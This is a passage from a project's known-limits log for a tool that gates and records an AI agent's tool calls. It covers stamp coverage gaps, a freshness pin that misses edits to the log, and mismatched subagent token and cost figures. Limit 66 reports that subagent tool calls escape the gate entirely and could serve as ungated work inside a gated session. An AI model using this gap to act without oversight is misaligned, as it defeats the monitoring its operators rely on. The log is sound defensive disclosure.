instead of "the matcher logic", which is what invited the gap in the first place.

**Related.** Limit 62 is the same file being wrong about paths; this is the record
being wrong about limit 62. A stamp that does not move when 62 is fixed is how a
reader would fail to notice the fix landed.

## 64. The whole-tree fingerprint exists, and it is wired to the reader instead of the record

Found 2026-09-02, following limit 63's own stated residual to the place it leads,
and finding the fix already built and pointed the wrong way.

This repository computes **two** code identities, and they cover different things.

| Stamp | Covers | Reaches |
|---|---|---|
| `matcherVersionHash()` | named functions in `src/policy/index.js` (and per limit 63, not all of them) | **every receipt**: `gated-action`, `policy-warn`, grant, egress, session-start |
| `computeSourceDigest()` | **every `.js` file under `src/` and `bin/`** | MCP tool responses only, as `_lotorBuild` |

**Measured, not argued.** `test/stamp-reach-coverage.test.js` asserts all of it
against the tree. On the build this entry was written against: the build digest is
`47ed7876d2652e68`, over **50 files / 522,651 bytes**; the matcher stamp is
`matcher/1 95291ff6385151ca`. The digest's file set contains `src/gate/index.js`,
`src/grant/check.js`, `src/chain/index.js`, `src/store/index.js` and
`bin/hook-pre-tool-use.js` — every module that decides whether an action is
allowed. The matcher stamp contains none of them. And the digest has exactly two
consumers in the whole tree, `src/mcp/build-identity.js` and `src/mcp/server.js`,
neither of which writes to the chain.

**What it costs.** Change the gate, the grant checker, the chain writer, the store,
or the pre-tool-use hook, and every receipt written after the change is
byte-comparable with every receipt written before it. `matcherHash` is unmoved,
because none of that code is in the policy module. A reader asking the question
receipts exist to answer — *were these two decided by the same code?* — is told yes,
and the honest answer is unknown. The MCP reader is told the truth in the same
minute, on a response that is discarded when the call returns.

**Why this is its own entry rather than limit 63's residual.** Limit 63 names the
gap ("behavior that reaches the decision from outside it would remain unstamped")
and treats it as an accepted ceiling. It is not a ceiling. **The instrument that
closes it is already in this repository, already tested, already computing the
right value on every MCP call.** The defect is not a missing capability, it is a
wire going to the wrong consumer, and that is a different and much cheaper thing to
fix. Limit 63's repair (widening `parts`) does not touch this and should not be
read as covering it.

**The asymmetry is the sharpest part.** The ephemeral artifact carries the strong
identity. The permanent artifact carries the weak one. That is exactly backwards
for a project whose thesis is that the record outlives the reader, and it is the
same shape as limit 41's original incident: the chain was intact and signed the
whole time, and what could not be trusted was the account of which code produced
the answer.

**The repair, and why it is not done here.** Carry the source digest (short form
plus full, per limit 50) onto `session-open` at minimum, where it costs one field
per session rather than one per action, and let per-action receipts inherit it by
session id. That edit touches `src/gate` and `bin/hook-*` and is therefore
non-delegable core, so it queues for a signing sitting rather than riding along
with this disclosure.

**Residual after that repair, stated now.** A digest over `src/` and `bin/` still
misses `node_modules` (a dependency upgrade moves nothing), anything loaded by
absolute path from outside the repository, and every non-`.js` input: policy files,
settings, the chain itself. All 50 source files are `.js` today, so the extension
filter has no live hole; a future `.mjs` or `.cjs` under either directory would be
unstamped and nothing would say so. And a digest detects without explaining, which
is limit 53 again.

**Related.** Limit 41 shipped this digest to stop a stale reader misreporting a fix
as a defect; it did that, and stopped at the reader. Limit 53 is why the digest
cannot say what changed. Limit 63 is the narrow stamp being narrower than it claims;
this is the wide one not being anywhere it matters.

## 65. The freshness pin binds the code, and never the log it lives in

Limit 29 gave `KNOWN-LIMITS.md` a pin: a comment block at the top naming the commit
the log was verified against, plus `npm run limits-pin -- --check` so a reader in a
different checkout is told they are reading a description of somewhere else. That
works, and the design decision underneath it is right: the pin names **the last
commit that touched `src/`**, not `HEAD`, because stamping is itself a commit that
edits only this file. A `HEAD`-based pin could only ever name its own parent and
would read `diverged` for every reader forever, training them to ignore it.

**The consequence was not carried through.** A commit that edits only this log does
not move the last `src/` commit either. So the pin cannot notice it. The check
answers "has the code moved since the log was stamped?" and has no way to answer
"is this the log that was stamped?"

**Measured on a synthetic tree, not reasoned** (the real repository was not written
to; `writePin`/`checkPin` were the shipped functions, and the commit resolution was
reproduced verbatim from `resolvePinTarget`):

| what changed after stamping | `src/` commit | reported |
|---|---|---|
| nothing | unmoved | `current` |
| a new entry appended | unmoved | `current` |
| an entry deleted, and another's claim reversed | unmoved | `current` |
| a source file edited | moved | `diverged` |

The third row is the one that matters. An entry can be added that was never held
against any code, an entry can be deleted, and a limit's claim can be inverted from
"this is not covered" to "this is covered", and the checker reports `current` and
exits **0**. It does not merely fail to complain. It certifies.

**What a reader should not conclude from `current`.** Not that the entries were
verified. Not that the log is the one the stamp was applied to. Only that `src/` has
not moved since somebody last ran `--stamp`. The pin block's own wording invites the
stronger reading, because it says entry numbering, entry presence, and every claim
are guaranteed for the pinned commit, and a reader who sees `current` will take that
guarantee as live.

**Why this is not the residual already declared.** `src/limits/pin.js` declares two:
that a commit can carry a false pin, which review catches, and that touching code
without re-stamping leaves a stale pin, which `--check` surfaces as divergence. Both
are about the code half. This is the log half, it is silent rather than surfaced, and
it needs no liar and no reviewer error. The mechanism working exactly as designed
produces it.

**Aggravating, and worth stating plainly: nothing runs the check.** It is not in
`npm test`, and this repository has no CI at all. The shipped pin has been diverged
since 2026-08-23 (pinned `2173d23`, last `src/` commit `9b8b862` at the time of
writing) and no automated reader has said so once.

**The repair, drafted and gated.** Add `body-sha256` to the pin block, covering the
file with the pin block itself removed so that stamping stays stable and limit 29's
self-invalidation problem does not return. A pin whose commit matches but whose
digest does not is a third status, `edited`: the code is where the log says it is,
and the log is not. Exit 1, like divergence, so a future CI can gate on it. A v1 pin
with no digest keeps v1 semantics exactly, so old pins are not retroactively failed;
re-stamping upgrades them. **The patch was written and the gate refused it** as a
self-modification of `src/`, correctly, so it queues for a signing sitting rather
than landing with this disclosure.

**Residual after that repair.** A digest binds the text and says nothing about
whether the text is true, which is limit 1 in a different coat. Re-stamping still
asserts verification that nobody checks, and a liar re-stamps. The digest converts a
silent gap into a prompt to re-verify; it does not perform the verification.

**Related.** Limit 29 is the pin this extends. Limit 53 is why a digest detects
without explaining. Limits 63 and 64 are the same family read three ways: 63 is a
stamp narrower than it claims, 64 is a wide stamp wired somewhere it does not
persist, and this is a stamp that covers the wrong artifact entirely.

---

## 66. Subagent tool use is outside the witness entirely

**Found 2026-09-02**, on a real dispatch: one parent session, three concurrent
children, chain rows counted across the window.

Three Bash calls executed inside the measured window and produced **zero chain
rows**. The parent's own calls in the same minutes produced a row every time,
which is the control that makes the absence a measurement rather than an
impression. **The gate cannot see, record, or stop anything a subagent does.**

In LOOSE mode nothing was being stopped anyway, so today this reads as
bookkeeping. Under a herded configuration it is a hole in **enforcement**:
dispatching would be a way to do ungated work inside a gated session. The
gap is the same size either way; only the consequence changes with posture.

**The measurement.** The three children (`a0113e1c3f129f638`,
`acd87cfd8747b4605`, `aeea528ee5379e3dc`) each wrote a transcript carrying
`sidechain=true`, the parent session id, and the parent's `tool_use` uuid. The
material to attribute them exists on disk and is correctly keyed. **What does
not exist is any row in the chain.** The reader that proved this
(`projects/meter/tools/trace-bridge.py`) lives outside this repository, so a
reader of this log cannot re-run it from here; the evidence is the absence of
chain rows, which anyone can check on their own dispatch.

**What a reader should not conclude.** Not that an honest agent reaches this by
accident. Whether the hole is reachable without intent is **not established**
and is the next probe. Stated at its floor: the witness is blind to subagent
actions, confirmed on a live dispatch rather than inferred from the code.

**Related.** Limit 67 is the same dispatch reporting numbers that do not match
its own transcripts. Limit 44 is the other enforcement gap found by probing
rather than by reading.

## 67. The harness's reported subagent token figure does not reconcile with the transcript

**Found 2026-09-02**, comparing what the harness reports per child against what
the child's own transcript records.

Reported per child: **32,395 / 32,481 / 32,504**. Three near-identical numbers.
The transcripts, summed excluding cache reads, give **32,512 / 25,069 /
25,132**. Two of the three are off by about **7,400**, and the reported figures
do not track the observed spread at all.

**The arithmetic, so it can be checked.** Child one recorded `in=4 out=149
cache_write=32359`, summing to 32,512. Child two recorded `in=6 out=456
cache_write=24607`, summing to 25,069. Child three recorded `in=6 out=495
cache_write=24631`, summing to 25,132. Cache reads (28,799 / 65,449 / 65,451)
are excluded from the sum because they are priced separately.

**The convenient number is not the auditable one.** Anything priced from the
harness notification is wrong for two of these three calls.

**What a reader should not conclude.** This does not establish which side is
correct. It establishes that they disagree by a margin large enough to change a
price, and therefore that a receipt must be built from the transcript, which is
the artifact the work actually left behind.

**Related.** Limit 66 is the same dispatch leaving no chain row at all. Limit 69
is what happens to the dollars once the tokens are settled.

## 68. The subagent reader depends on an undocumented harness path layout, and fails to a false zero

**Found 2026-09-02**, by reading the reader rather than trusting it.

Child transcripts are located at
`<project-slug>/<parent-session-id>/subagents/agent-<agentId>.jsonl`. That
layout is an internal detail of the harness and can change in any release
without notice. The reader as written **globs that pattern and reports a count**
(`projects/meter/tools/trace-bridge.py`, the glob at line 24 and the
`children found :` print at line 73). Across all 91 lines it reads **no version
or schema marker** before walking the directory.

**So its failure mode is a false zero.** Rename the directory, change the
suffix, move the level, and the reader reports `children found : 0` and exits
clean. **Silence would read as "no subagents ran."** That is not hypothetical:
the first scan of this layout on 2026-09-02 reported zero sidechain entries
anywhere, and it was wrong. The absence was in the query, not in the world.

**A reader must distinguish "no children" from "cannot find children."** The two
are the same output today and mean opposite things.

**What a reader should not conclude.** Not that the layout is unstable. Only
that nothing here would notice if it moved, and that the noticing has to be
built rather than assumed.

**Related.** Limit 41 is the same class: a reader that could not say which build
answered. Limit 53 is why a detector that cannot explain itself is still worth
having, and why this one is not yet one.

## 69. Subagent cost is derived rather than reported, and the derivation carries a price table's staleness

**Found 2026-09-02**, by tracing which inputs produce the dollar figures.

No harness output contains a dollar figure for a subagent call. Every dollar in
the trace-bridge report is **computed**: measured tokens multiplied by a price
table at `drive/lotor/price-table.json`, whose own `"date"` field reads
**2026-08-29**, with `"basis": "public list prices, USD per million tokens"`.
Four days stale at the time of measurement, and list prices rather than billed
ones.

**The tokens are measured. The dollars are computed.** The three children
priced at $0.341734, $0.290224 and $0.291440, totalling **$0.923399** for three
`echo` calls. The cache-write to hand each child its context is the entire bill;
the work is free.

**The consequence for any receipt this produces.** A receipt carrying a dollar
figure without the price-table date beside it will be read as measured when it
is computed. That is not a hypothetical misreading: it is the exact defect
caught twice inside the run that produced these numbers.

**What a reader should not conclude.** Not that the figures are wrong. Staleness
is not error. The claim is narrower and harder to dismiss: **a reader cannot
tell whether they are wrong without being handed the table's date**, so the date
travels with the number or the number is not evidence.

**Related.** Limit 68 is the same reader trusting an undocumented path without a
schema stamp; this is the same reader trusting a table without a freshness
stamp.
